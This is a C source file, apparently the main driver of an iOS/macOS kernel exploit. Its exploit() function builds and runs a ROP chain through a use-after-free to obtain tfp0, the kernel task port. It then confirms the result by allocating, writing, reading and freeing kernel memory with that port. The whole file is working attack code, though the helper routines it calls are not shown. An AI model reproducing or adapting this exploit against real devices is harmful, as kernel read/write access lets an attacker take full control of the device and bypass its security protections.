#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/vm_prot.h>

#include <common.h>
#include <io.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>
#include <rop.h>
#include <uaf.h>

extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

mach_port_t tfp0 = MACH_PORT_NULL;

int exploit(void)
{
    addr_t *chain = uaf_rop_stack();
    addr_t *head  = chain;
    task_t task;
    
    // Build ROP chain
    build_rop_chain(&head, &task);
    
    // Print ROP chain
    for(addr_t *frame = chain; 1; frame = (addr_t*)frame[0])
    {
        LOG("fp: " ADDR, frame[0]);
        LOG("lr: " ADDR, frame[1]);
        if(!(frame[0] >= (addr_t)chain && frame[0] < (addr_t)head))
        {
            break;
        }
        for(addr_t *reg = &frame[2]; (addr_t)reg < frame[0]; ++reg)
        {
            LOG("    " ADDR, *reg);
        }
        LOG("----------------------");
    }
    
    usleep(10000);
    
    // Run ROP chain
    LOG("Running ROP chain");
    uaf_rop();
    
    usleep(10000);
    
    tfp0 = task;
    LOG("got tfp0? 0x%08x", tfp0);
    if(!tfp0 || !MACH_PORT_VALID(tfp0))
    {
        ERR("tfp0 failed");
        return -1;
    }
    
    LOG("checking tfp0");
    mach_vm_address_t page = 0;
    kern_return_t retval = mach_vm_allocate(tfp0, &page, 0x4000, VM_FLAGS_ANYWHERE);
    LOG("mach_vm_allocate: 0x%llx, %s", page, mach_error_string(retval));
    if(retval != KERN_SUCCESS || page == 0)
    {
        ERR("mach_vm_allocate failed");
        return -1;
    }
    
    uint64_t testdata[] = { 0x4141414141414141, 0x0123456789abcdef };
    retval = mach_vm_write(tfp0, page, (vm_offset_t)testdata, sizeof(testdata));
    LOG("mach_vm_write: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_write failed");
        return -1;
    }
    
    uint64_t check[2] = {};
    mach_vm_size_t size = sizeof(check);
    retval = mach_vm_read_overwrite(tfp0, page, sizeof(check), (mach_vm_address_t)check, &size);
    LOG("mach_vm_read_overwrite: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_read_overwrite failed");
        return -1;
    }
    
    LOG("data: " ADDR " " ADDR, check[0], check[1]);
    if(check[0] != testdata[0] || check[1] != testdata[1])
    {
        ERR("data mismatch");
        return -1;
    }
    
    retval = mach_vm_deallocate(tfp0, page, 0x4000);
    LOG("mach_vm_deallocate: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_deallocate failed");
        return -1;
    }
    
    return 0;
}
